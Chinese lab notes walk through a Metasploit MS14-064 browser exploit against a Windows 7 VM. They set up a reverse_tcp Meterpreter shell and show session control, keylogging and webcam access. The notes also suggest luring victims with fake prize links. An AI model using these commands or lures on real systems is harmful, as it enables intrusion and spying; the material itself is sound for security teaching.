[TOC]

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/e275148b-a333-405c-892b-0c14af938d6b.jpg)

针对系统,系统软件;(shell就是界面)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/adabdf66-893a-453b-9c7f-9fdb0885fa41.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/8112ad51-de4f-4d36-b95e-5cbc70aa336a.jpg)

在kali_linux里面用它;
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/c473b601-a644-42e9-9ae1-16c414fcb665.jpg)
```
service postgresql start
msfdb init
msfconsole
```
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/034f9734-c019-4e7d-b814-4a825938bc0d.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/7e9b4174-448f-4b3d-b342-562cf3a688c2.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/e8c3387a-d2b2-4f79-9af5-05c996055395.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/a0b1def5-3389-4c03-88b8-1fb53e9ef52c.jpg)

这里主要用exploite+payload!!!

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/fba1c2c2-aa37-4f0b-82b9-008010ca3a2d.jpg)

powershell是微软推出的一个命令行界面,它不同于dos命令！
## 实验准备
需要开两台虚拟机，一台win7,一台kali虚拟机；
(我这里两台的配置内存和处理器皆设为1G,1)
kali里面先运行上面的命令;
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/4ffe84d9-04a3-4c0e-9f6b-9121ebdb43b5.jpg)

发现没有ping通！！
而两个虚拟机用的皆是桥接模式;可能是win7里面的防火墙w问题;
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/2118bda2-dd58-45dc-affc-22de1ad70321.png)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/093f2411-d12c-4575-acef-c9e053b73d00.png)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/5078e820-1df0-4c09-ac69-fe43b98a1d57.png)

将下面这两个启用即可：
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/095e39a2-b673-403c-89c1-1fcf0e38e359.png)
## 步骤
再来看一看kali里面:
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/8ca951d9-e35d-47e1-a49b-6933ded0f204.jpg)


搜索漏洞编号`search MS14_064`,可以找到三个相应的漏洞利用;
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/bbb939e4-6b97-4c34-bb30-07c9c6d84ff4.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/2057b22b-a2b1-4105-b20a-b43830441517.jpg)
敲的时候可以利用Tab键;
下面对这个exploite进行设置;
`use exploit/windows/browser/ms14_064_ole_code_execution`
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/480fc7d0-18ec-409e-911f-91ff535c238d.jpg)
查看当前设置:`show options`

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/a9698341-4f0c-47eb-a9b2-e7ca33b4122d.jpg)

`set allowpowershellprompt true`设置powershell可以用的;
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/aa4826a4-5807-4774-81d9-092c1c2e9f0c.jpg)
可以看到设置好了,下面一个需要进行SRVHOST的设置;
host是主机的意思,srv是服务的意思;
利用这个exploite需要将当前的kali设置为web服务器！在web服务器里面会自动生成网页！然后对方（攻击的目标）只要访问了这个网页,就会执行缓冲区溢出的代码;而要搭建一个web服务器,就需要指定一个ip;SRVHOST就是给服务器指定ip!
`set srvhost 192.168.2.135`
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/42d88f75-7cd7-4bc8-b06b-493006ad2a6f.jpg)

这里就把ip设为kali_linux的ip;

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/94312ef5-dfd4-4f6c-9c58-784ca7d6c22d.jpg)


还有一个是srvport需要设置:(可以用默认的,也可以改成别的端口号)
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/8c63e149-91bc-42e3-a131-5c2705cb8c33.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/06290615-9100-47b3-8b45-3c1365cd66ef.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/c482198d-5627-44b3-9fc9-74e398773fc0.jpg)

```
set payload windows/meterpreter/reverse_tcp

```
这里这个名字`windows/meterpreter/reverse_tcp`务必记住！！！

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/eacc598c-2d1d-4ded-a7b3-acce277660fb.jpg)

下面是需要对payload进行设置的;
LHOST这里的L指的是listen;
攻击对方 成功之后,实际上就是在对方系统里面运行木马程序;这里的payload就是一个木马程序;
现在的木马程序都是反弹连接木马,木马程序分客户端和服务端;
如果你要在被攻击的计算机上,来运行服务端;你在你的计算机上面运行客户端,让服务端来连接客户端;这叫反弹连接(反弹shell);
如果黑客主动连接肉鸡的话,一是你不知道肉鸡ip,二是如果它在内网里面用的私有ip,你也没有办法主动连接;
所以要在黑客端口开放一个端口来监听,让肉鸡连接你;
上面这两个一个是监听的ip(这里是kali机的ip)还有一个是监听的端口(这里的端口是4444,与上面的8080不一样！8080那边是在kali 上面搭建的一个服务器,在服务器里面做的一个 有代码的网页！人家一访问你就中招了);4444端口是监听肉鸡的连接的！

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/f711bb9c-f8d8-4af8-adeb-a7d8d9ebf583.jpg)
`set lhost 192.168.2.135`
这里的端口使用默认的4444端口！
## 执行
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/9e3975fb-ae9c-4384-a2dc-abb16476483a.jpg)
使用命令`exploit`
此时kali已经变成web服务器了！
这个url是有攻击代码的网页！只要让对方访问这个网页就中招了！
下面一步就是如何把这个url散布出去,让别人访问！
(有的人可以发个中奖信息,其实链接是这个url;有的人是发个网页里面是个美女图加一个浮动框架就可以让人中招；不过前提是这些人没有打这个漏洞的补丁！所以说0day很值钱！！)

这里直接将此连接复制至另外一个虚拟机里面(通过物理机中转一下！)
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/af6f1015-5b19-47b6-8898-16dd45f41c7e.png)

下面这个是kali里面的:
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/92fa8043-d2a5-46c5-bebb-adca2409c691.jpg)
此时win7已经中了木马,获得其系统shell;
现在已经控制虚拟机了,怎么用呢,
`session -l`功能是查看有几个中招的;

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/019c9148-df8e-4c9e-9422-a3b9c93f0cc8.jpg)

`sessions -i 1
`
表明想控制一号（即打开一号机的木马）
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/5affb79d-9c2e-44ce-9d1e-283c7e218086.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/d042f67b-9a8b-428a-a9e9-270c4e0365c8.jpg)
进入到木马控制界面！！！

输入help查看如何利用木马！！
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/84a05df8-4b7e-455c-b53a-1a1386e229f2.jpg)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/03dffe90-493f-4ec3-80cd-006098ea1501.jpg)
exit退出;
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/e22b22cf-b4ba-4608-8a8b-a84d3954b738.jpg)
![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/9cb2e3ee-4f02-48f5-9aeb-e1bbdfa1b6aa.png)

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/6f2e03d2-a799-4070-88b5-d725ed42284b.jpg)

监听键盘：889910就是刚才在肉鸡里面用键盘输入的;

![]((24-25)MSF的使用_XSS跨站点脚本攻击_实现网页挂马_files/8f39e176-49e3-4d50-a806-719a9893b9f1.jpg)

摄像头的相关操作！


## 相关命令总结
```
service postgresql start
msfdb init
msfconsole


search MS14_064

use exploit/windows/browser/ms14_064_ole_code_execution

show options

set allowpowershellprompt true

set srvhost 192.168.2.135


set payload windows/meterpreter/reverse_tcp

set lhost 192.168.2.135
exploit
拷贝url至相关机器上面(实际中要让被攻击这点击这个url)


session -l

sessions -i 1
```






